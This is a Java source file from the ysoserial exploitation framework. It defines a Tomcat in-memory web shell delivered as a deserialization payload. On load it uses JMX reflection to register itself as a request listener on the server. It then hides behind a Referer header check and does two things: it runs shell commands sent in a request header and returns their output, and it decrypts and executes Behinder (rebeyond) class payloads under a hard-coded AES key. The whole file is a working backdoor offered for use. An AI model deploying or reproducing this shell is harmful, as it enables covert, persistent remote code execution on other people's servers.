package ysoserial.payloads.templates;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Scanner;
import java.util.Set;

public class TomcatListenerMemShellFromJMX extends AbstractTranslet implements ServletRequestListener {
    static {
        try {
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot的jmx中为Tomcat而非Catalina
                objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }

            for (NamedObject namedObject : objectSet) {
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(obj);

                TomcatListenerMemShellFromJMX listener = new TomcatListenerMemShellFromJMX();
                standardContext.addApplicationEventListener(listener);
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
// Listener马没有包装类问题
        try {
            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
            Field f = requestFacade.getClass().getDeclaredField("request");
            f.setAccessible(true);
            Request request = (Request) f.get(requestFacade);
            Response response = request.getResponse();
            // 入口
            if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                // cmdshell
                if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                    String cmd = request.getHeader("cmd");
                    if (cmd != null && !cmd.isEmpty()) {
                        String[] cmds = null;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            cmds = new String[]{"cmd", "/c", cmd};
                        } else {
                            cmds = new String[]{"/bin/bash", "-c", cmd};
                        }
                        String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                        response.resetBuffer();
                        response.getWriter().println(result);
                        response.flushBuffer();
                        response.finishResponse();
                    }
                } else if (request.getHeader("x-client-data").equalsIgnoreCase("rebeyond")) {
                    if (request.getMethod().equals("POST")) {
                        // 创建pageContext
                        HashMap pageContext = new HashMap();

                        // lastRequest的session是没有被包装的session!!
                        HttpSession session = request.getSession();
                        pageContext.put("request", request);
                        pageContext.put("response", response);
                        pageContext.put("session", session);
                        // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
                        String payload = request.getReader().readLine();

//                        System.out.println(payload);
                        // 冰蝎逻辑
                        String k = "e45e329feb5d925b"; // rebeyond
                        session.putValue("u", k);
                        Cipher c = Cipher.getInstance("AES");
                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        method.setAccessible(true);
                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                        Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                        evilclass.newInstance().equals(pageContext);
                    }
                } else {
                    response.resetBuffer();
                    response.getWriter().println("error");
                    response.flushBuffer();
                    response.finishResponse();
                }
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }
}
